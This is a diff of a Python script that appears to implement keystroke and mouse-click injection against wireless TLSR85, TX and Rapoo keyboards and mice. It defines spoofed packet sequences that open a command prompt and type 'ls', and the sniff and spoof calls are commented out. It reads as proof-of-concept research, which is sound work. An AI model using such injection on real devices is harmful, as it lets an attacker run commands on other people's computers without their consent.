@@ -41,11 +41,16 @@ common.init_args('./main.py')
 common.parse_and_init()
 
 
+"""
+----------------------------TLSR85----------------------------
+"""
+
 trust_keyboard = Tlsr85_Keyboard("4a:b4:cb:80", "aa:aa:b5", 0x11021, 0x24bf)
-# poss_keyboard = Tlsr85_Keyboard("d5:54:cb:80", "aa:aa:cc", 0x11021, 0xcb01)
+#poss_keyboard = Tlsr85_Keyboard("d5:54:cb:80", "aa:aa:cc", 0x11021, 0xcb01)
+trust_mouse = Tlsr85_Mouse("4a:b4:cb:dc", "aa:aa:aa:b5", 0x11021, 0x24bf)
 
 
-attack = [
+attack_tlsr85_keyboard = [
     trust_keyboard.build_packet(modifiers=[KeyboardModifiers.MODIFIER_GUI_LEFT]),
     lambda: time.sleep(0.5),
     trust_keyboard.build_packet([KeyboardScancode.KEY_C]),
@@ -59,16 +64,20 @@ attack = [
     trust_keyboard.build_packet([KeyboardScancode.KEY_KEYPAD_ENTER])
     ]
 
-
-#trust_keyboard.spoof(attack)
-
-trust_mouse = Tlsr85_Mouse("4a:b4:cb:dc", "aa:aa:aa:b5", 0x11021, 0x24bf)
 #trust_keyboard.sniff()
+#trust_mouse.sniff()
+#trust_keyboard.spoof(attack_tlsr85_keyboard)
 
-tx_mouse = Tx_mouse("55:79:90:16", 0x11021, 0x6818)
+
+
+"""
+----------------------------TX----------------------------
+"""
+
 tx_keyboard = Tx_Keyboard("55:79:90:16", 0x11021, 0x6818)
+tx_mouse = Tx_mouse("55:79:90:16", 0x11021, 0x6818)
 
-attack = [
+attack_tx_keyboard = [
     *tx_keyboard.build_packet(modifiers=[KeyboardModifiers.MODIFIER_GUI_LEFT]),
     lambda: time.sleep(0.5),
     *tx_keyboard.build_packet([KeyboardScancode.KEY_C]),
@@ -82,33 +91,40 @@ attack = [
     *tx_keyboard.build_packet([KeyboardScancode.KEY_KEYPAD_ENTER])
     ]
 
-#tx_keyboard.spoof(attack)
+attack_tx_mouse = tx_mouse.build_packet([MouseClickType.LEFT_CLICK], x_move="8888")
 
-m = tx_mouse.build_packet([MouseClickType.LEFT_CLICK], x_move="8888")
-# tx_mouse.spoof(m)
+#tx_mouse.sniff()
+#tx_keyboard.spoof(attack_tx_keyboard)
+#tx_mouse.spoof(attack_tx_mouse)
 
-rapoo_Keyboard = Rapoo_Keyboard("c7:92:78:79", 0x11021, 0xefdf)
 
-attack = [
-    rapoo_Keyboard.build_packet([KeyboardScancode.KEY_LGUI]),
+"""
+----------------------------Rapoo----------------------------
+"""
+
+rapoo_keyboard = Rapoo_Keyboard("c7:92:78:79", 0x11021, 0xefdf)
+rapoo_mouse = Rapoo_Mouse("c7:92:78:79", 0x11021, 0xefdf)
+
+attack_rapoo_keyboard = [
+    rapoo_keyboard.build_packet([KeyboardScancode.KEY_LGUI]),
     lambda: time.sleep(1),
-    rapoo_Keyboard.build_packet([KeyboardScancode.KEY_C]),
-    rapoo_Keyboard.build_packet([KeyboardScancode.KEY_M]),
-    rapoo_Keyboard.build_packet([KeyboardScancode.KEY_D]),
+    rapoo_keyboard.build_packet([KeyboardScancode.KEY_C]),
+    rapoo_keyboard.build_packet([KeyboardScancode.KEY_M]),
+    rapoo_keyboard.build_packet([KeyboardScancode.KEY_D]),
     lambda: time.sleep(1),
-    rapoo_Keyboard.build_packet([KeyboardScancode.KEY_KEYPAD_ENTER]),
+    rapoo_keyboard.build_packet([KeyboardScancode.KEY_KEYPAD_ENTER]),
     lambda: time.sleep(1.5),
-    rapoo_Keyboard.build_packet([KeyboardScancode.KEY_L]),
-    rapoo_Keyboard.build_packet([KeyboardScancode.KEY_S]),
-    rapoo_Keyboard.build_packet([KeyboardScancode.KEY_KEYPAD_ENTER])
+    rapoo_keyboard.build_packet([KeyboardScancode.KEY_L]),
+    rapoo_keyboard.build_packet([KeyboardScancode.KEY_S]),
+    rapoo_keyboard.build_packet([KeyboardScancode.KEY_KEYPAD_ENTER])
     ]
 
-
-#rapoo_Keyboard.spoof(attack)
-
-rapoo_Mouse = Rapoo_Mouse("c7:92:78:79", 0x11021, 0xefdf)
-#rapoo_Keyboard.sniff()
-attack = [
-    rapoo_Mouse.build_packet([MouseClickType.LEFT_CLICK])
+attack_rapoo_mouse = [
+    rapoo_mouse.build_packet([MouseClickType.LEFT_CLICK])
 ]
-#rapoo_Mouse.spoof(attack)
+
+
+#rapoo_keyboard.sniff()
+#rapoo_mouse.sniff()
+#rapoo_keyboard.spoof(attack_rapoo_keyboard)
+#rapoo_mouse.spoof(attack_rapoo_mouse)
